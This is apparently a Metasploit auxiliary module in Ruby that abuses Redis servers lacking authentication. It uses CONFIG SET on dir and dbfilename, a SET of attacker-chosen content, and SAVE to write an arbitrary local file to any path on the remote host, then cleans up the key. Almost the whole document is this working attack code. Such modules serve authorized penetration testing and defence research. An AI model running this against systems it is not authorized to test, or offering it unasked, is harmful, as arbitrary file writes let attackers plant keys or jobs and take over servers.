##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Auxiliary::Redis

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Redis Unauthenticated File Upload',
        'Description'   => %q(
          This module can save data to file in remote redis server,
          Because redis is unprotected without a password set up.
        ),
        'License'       => MSF_LICENSE,
        'Author'        => ['Nixawk'],
        'References'    => [
          ['URL', 'http://antirez.com/news/96'],
          ['URL', 'http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/'],
          ['URL', 'http://redis.io/topics/protocol']
        ],
        'Platform'      => %w(unix linux),
        'Targets'       => [['Automatic Target', {}]],
        'Privileged'    => true,
        'DefaultTarget' => 0,
        'DisclosureDate' => 'Nov 11 2015'
      )
    )
    register_options(
      [
        OptPath.new('LocalFile', [false, 'Local file to be uploaded']),
        OptString.new('RemoteFile', [false, 'Remote file path'])
      ]
    )
  end

  def send_file(path, content)
    dirname = File.dirname(path)
    basename = File.basename(path)

    original_dir = send_redis_command('CONFIG', 'GET', 'DIR')
    data = send_redis_command('CONFIG', 'SET', 'DIR', dirname)
    return unless data.include?('+OK')

    data = send_redis_command('CONFIG', 'SET', 'dbfilename', basename)
    return unless data.include?('+OK')

    key = Rex::Text.rand_text_alpha(32)
    data = send_redis_command('SET', key, content)

    return unless data.include?('+OK')

    data = send_redis_command('SAVE')
    return unless data.include?('+OK')
    print_good("#{peer} -- saved file to #{path}")

    data = send_redis_command('DEL', key)
    return unless data.include?('+OK')
  end

  def check
    connect
    data = send_redis_command('INFO')
    disconnect
    if data && /redis_version:(?<redis_version>\S+)/ =~ data
      report_redis(redis_version)
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def setup
    @upload_content = "\n\n#{IO.read(datastore['LocalFile'])}\n\n\n" if datastore['LocalFile']
  end

  def run_host(_ip)
    fail_with(Failure::BadConfig, "LocalFile must be set") unless datastore['LocalFile']
    fail_with(Failure::BadConfig, "RemoteFile must be set") unless datastore['RemoteFile']
    return unless check == Exploit::CheckCode::Vulnerable

    connect
    unless (res = send_redis_command('PING'))
      vprint_error("#{peer} -- did not respond to our redis PING")
      return
    end

    if res =~ /PONG/
      vprint_good("#{peer} -- responded positively to our PONG")
      send_file(datastore['RemoteFile'], @upload_content)
    else
      vprint_good("#{peer} -- responded unknown to our PONG: #{res}")
    end
  ensure
    disconnect
  end
end
